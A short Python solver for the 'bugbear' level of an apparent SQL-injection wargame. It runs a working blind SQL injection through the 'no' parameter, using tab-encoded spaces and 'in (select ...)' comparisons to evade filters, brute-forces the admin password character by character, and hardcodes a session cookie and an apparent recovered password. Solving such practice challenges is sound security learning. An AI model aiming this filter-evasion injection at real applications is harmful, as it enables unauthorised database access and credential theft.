from hashlib import new
from requests import get

import string


url = "https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php"
cookie  = dict(PHPSESSID="lpaiqju1pvd389508vh94qhl4s")
symbol = "!@#$%^&*()_-=+"
letters = string.digits + string.ascii_letters + symbol
password = ""
length = 1


# get password length
while True:
    param = "?pw=test&no=1||id%09in%09(select%09\"admin\")%26%26%09length(pw)%09in%09(select%09"+str(length)+")"
    new_url = url+param
    req = get(new_url, cookies=cookie)
    print("[length] " + str(length))
    if(req.text.find("Hello admin") > 0):
        print("Found password lenght= " + str(length))
        break
    length +=1

for i in range(1, length+1):
    print("[idx]: " + str(i))
    for x in letters:
        param = "?pw=test&no=1||id%09in%09(select%09\"admin\")%09%26%26%09mid(pw,"+str(i)+",1)%09in%09(select%09\""+str(x)+"\")"
        print(param)
        new_url = url+param

        req = get(new_url, cookies=cookie)
        if(req.text.find("Hello admin") > 0):
            print("[Found] password char " + str(i) + " = " + str(x))
            password += str(x)
            break

print("Password: " + password)



"""
subquery
ganti space = %09

?pw=test&no=1||12%09in%09(select%09"12")


52dc3991
"""